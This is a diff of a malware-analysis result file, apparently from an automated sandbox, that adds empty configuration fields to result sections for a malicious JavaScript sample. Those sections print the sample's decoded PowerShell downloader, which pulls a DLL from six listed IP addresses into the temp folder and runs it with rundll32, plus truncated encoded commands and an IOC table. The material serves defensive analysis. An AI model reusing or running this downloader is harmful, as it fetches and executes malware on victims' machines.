@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: shell.application\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell via powershell.exe\n\t\tIOC: The script ran the command 'powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGU...\n\t\tShell.Application[12].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAL...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -61,6 +64,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell application\n\t\tShell.Application[12].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAL...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -83,6 +87,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -101,6 +106,7 @@
       {
         "auto_collapse": false,
         "body": "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -120,6 +126,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"139.180.209.206\"}, {\"ioc_type\": \"ip\", \"ioc\": \"151.80.5.50\"}, {\"ioc_type\": \"ip\", \"ioc\": \"185.231.204.114\"}, {\"ioc_type\": \"ip\", \"ioc\": \"195.20.17.142\"}, {\"ioc_type\": \"ip\", \"ioc\": \"203.96.177.121\"}, {\"ioc_type\": \"ip\", \"ioc\": \"87.236.146.162\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://203.96.177.121/ljkdbdp.dathttp://195.20.17.142/ljkdbdp.dathttp://185.231.204.114/ljkdbdp.dathttp://87.236.146.162/ljkdbdp.dathttp://151.80.5.50/ljkdbdp.dathttp://139.180.209.206/ljkdbdp.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ljkdbdp.dathttp:\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 2,
@@ -157,6 +169,7 @@
       {
         "auto_collapse": false,
         "body": "View extracted file 06047c3d6874bfddc1b0efd003775f1dfc1d5285fb27482c77ac96aa04b2f653.cleaned for details.",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
